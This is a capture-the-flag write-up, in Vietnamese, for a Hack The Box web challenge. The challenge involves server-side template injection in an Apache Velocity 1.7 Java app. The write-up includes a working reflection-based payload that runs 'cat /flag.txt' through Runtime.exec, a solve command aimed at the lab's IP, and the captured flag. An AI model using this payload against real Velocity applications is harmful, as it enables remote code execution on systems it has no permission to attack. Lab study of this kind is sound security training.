# Labyrinth Linguist — Writeup (HTB Try Out / Web) (Tiếng Việt)

## 1. Đề
Challenge WEB (easy), source `web_labyrinth_linguist.zip` (password zip: `hackthebox`).
Target: `http://154.57.164.72:30986`
Mục tiêu: đọc `/flag.txt`, flag `HTB{...}`.
Form dịch "english → voxalith", field `text`.

## 2. Kiến thức nền
- **SSTI (Server-Side Template Injection)**: input được nhúng vào template rồi engine evaluate.
- **Apache Velocity 1.7**: cú pháp `#set($x=…)` / `$x`. Probe: `#set($x=7*7)$x` → `49`.
- RCE qua `$s.class.forName('java.lang.Runtime').getRuntime().exec(...)` rồi đọc `InputStream` bằng `#foreach`.
- Flag nằm `/flag.txt` (Dockerfile `COPY flag.txt /flag.txt`).

## 3. Phân tích
- `pom.xml`: artifact tên FreeMarker nhưng dependency thật là `velocity:1.7` (2 lần).
- `Main.java`: `text` (RequestParam) thay chuỗi `TEXT` trong `index.html`, rồi `runtimeServices.parse` + `Template.merge`.
- Không sanitize. Context chỉ có `name=World` — dùng empty string để lấy `.class`.
- Form POST `/` field `text`; GET `?text=` cũng được.

## 4. Vì sao hướng này
- Tên bài + file template + `replace("TEXT")` + Velocity parse → SSTI là hướng rẻ nhất.
- H2 (`#include`/`#parse` file) không cần vì đã có RCE.
- H3 (LFI `readFileToString`) path hardcode, kill.

## 5. Các bước
1. TRIAGE: GET `/` → 200, `<h2>Example text</h2>`.
2. POST `text=#set($x=7*7)$x` → `<h2>49</h2>` (Velocity).
3. Payload RCE đọc flag:
   ```
   #set($s='')#set($rt=$s.class.forName('java.lang.Runtime'))
   #set($chr=$s.class.forName('java.lang.Character'))
   #set($str=$s.class.forName('java.lang.String'))
   #set($ex=$rt.getRuntime().exec('cat /flag.txt'))$ex.waitFor()
   #set($out=$ex.getInputStream())
   #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
   ```
4. Replay `solve.py` lần 2 → cùng flag.

```text
python solve/solve.py --target http://154.57.164.72:30986
```

## 6. Flag
```
HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!_a3ce0020cb78a323c28c8b6d8769d3ed}
```
